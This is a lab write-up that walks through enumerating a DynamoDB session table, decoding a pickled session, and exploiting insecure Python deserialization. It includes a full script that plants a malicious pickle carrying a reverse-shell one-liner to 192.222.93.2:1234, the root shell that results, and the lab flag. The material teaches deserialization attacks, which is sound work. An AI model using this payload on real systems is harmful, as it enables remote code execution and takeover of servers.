# DynamoDB

List tables

```
root@attackdefense:~# aws --endpoint http://dynamodb.pentesteracademylab.appspot.com:4567 dynamodb list-tables
{
    "TableNames": [
        "session"
    ]
}
```

There are no records in `session` table

```
root@attackdefense:~# aws --endpoint http://dynamodb.pentesteracademylab.appspot.com:4567 dynamodb scan --table session
{
    "Items": [],
    "Count": 0,
    "ScannedCount": 0,
    "ConsumedCapacity": null
}
```

After logging in with given creds `guest/guest`, session object appears.

`sessionData` is a binary in base64 encoding format

```
root@attackdefense:~# aws --endpoint http://dynamodb.pentesteracademylab.appspot.com:4567 dynamodb scan --table session
{
    "Items": [
        {
            "sessionid": {
                "S": "291861251854427087918706439262060355831"
            },
            "sessionData": {
                "B": "KGRwMApTJ3Bhc3N3b3JkJwpwMQpWZ3Vlc3QKcDIKc1MnbmFtZScKcDMKVmd1ZXN0CnA0CnMu"
            }
        }
    ],
    "Count": 1,
    "ScannedCount": 1,
    "ConsumedCapacity": null
}
```

Decoding base64 - data stored is a pickled data

```
root@attackdefense:~# python
Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> data=base64.b64decode("KGRwMApTJ3Bhc3N3b3JkJwpwMQpWZ3Vlc3QKcDIKc1MnbmFtZScKcDMKVmd1ZXN0CnA0CnMu")
>>> data
"(dp0\nS'password'\np1\nVguest\np2\nsS'name'\np3\nVguest\np4\ns."
```

Unpickle the sessionData attribute value

```
>>> import pickle
>>> pickle.loads(data)
{'password': u'guest', 'name': u'guest'}
```

Value stored in sessionData is a pickled binary data base64 encoded. The web application unpickle the data upon retrieving from DynamoDB. We can upload a crafted pickled object to DynamoDB server and when deserialized, will execute commands on the machine

Create a putpickledobject script to upload a pickled object payload to DynamoDB

```python
import pickle
import subprocess
import os
import boto3

class Shell(object):
    def __reduce__(self):
        return (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.222.93.2\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&",))


pickledData = pickle.dumps(Shell())

client = boto3.client("dynamodb",endpoint_url="http://dynamodb.pentesteracademylab.appspot.com:4567")

client.put_item(
    Item={
        "sessionid":
        {
            'S': '291861251854427087918706439262060355831'
        },
        "sessionData":
        {
            'B':pickledData
        }
    }, TableName='session'
)
```

Run python put pickled object, refresh the webpage and get reverse shell
```
root@attackdefense:~# python putPickledObject.py 
root@attackdefense:~# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.222.93.2] from (UNKNOWN) [192.222.93.3] 46118
/bin/sh: 0: can't access tty; job control turned off
# id       
uid=0(root) gid=0(root) groups=0(root)
```

Find flag

```
# find / -name *flag* 2>/dev/null
/root/flag
# cat /root/flag
59323d0ec571e1105122d4f7041603d9
```


